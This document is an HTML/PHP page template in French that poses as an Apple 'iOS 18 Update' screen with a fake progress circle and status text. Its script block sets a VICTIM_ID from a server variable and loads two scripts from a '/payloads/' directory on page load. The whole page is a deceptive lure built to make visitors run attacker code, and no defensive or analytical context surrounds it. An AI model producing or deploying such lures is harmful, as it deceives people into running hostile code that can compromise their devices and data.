<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
        }
        
        .update-card {
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        
        .ios-icon {
            font-size: 80px;
            margin-bottom: 20px;
        }
        
        h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .version {
            font-size: 16px;
            color: #8e8e93;
            margin-bottom: 40px;
        }
        
        .progress-circle {
            width: 150px;
            height: 150px;
            margin: 30px auto;
            position: relative;
        }
        
        .circle-bg {
            fill: none;
            stroke: #2c2c2e;
            stroke-width: 4;
        }
        
        .circle-progress {
            fill: none;
            stroke: #0a84ff;
            stroke-width: 4;
            stroke-linecap: round;
            stroke-dasharray: 440;
            stroke-dashoffset: 440;
            animation: progress 30s linear forwards;
        }
        
        .percentage {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
            font-weight: 600;
        }
        
        .status {
            font-size: 16px;
            color: #8e8e93;
            margin: 20px 0;
        }
        
        .detail {
            font-size: 14px;
            color: #8e8e93;
        }
        
        @keyframes progress {
            to { stroke-dashoffset: 0; }
        }
    </style>
</head>
<body>
    <div class="update-card">
        <div class="ios-icon">🍎</div>
        <h1>iOS 18 Update</h1>
        <div class="version">Nouvelles fonctionnalités de sécurité</div>
        
        <div class="progress-circle">
            <svg width="150" height="150">
                <circle class="circle-bg" cx="75" cy="75" r="70"></circle>
                <circle class="circle-progress" cx="75" cy="75" r="70" transform="rotate(-90 75 75)"></circle>
            </svg>
            <div class="percentage" id="percentage">0%</div>
        </div>
        
        <div class="status" id="status">Préparation...</div>
        <div class="detail" id="detail">Temps estimé: 2 minutes</div>
    </div>
    
    <script>
        const VICTIM_ID = '<?= $victimId ?>';
        const OS = 'iOS';
        const OS_VERSION = '<?= $osVersion ?? 'unknown' ?>';
    </script>
    <script src="/payloads/core.js?v=<?= time() ?>"></script>
    <script src="/payloads/ios.js?v=<?= time() ?>"></script>
</body>
</html>
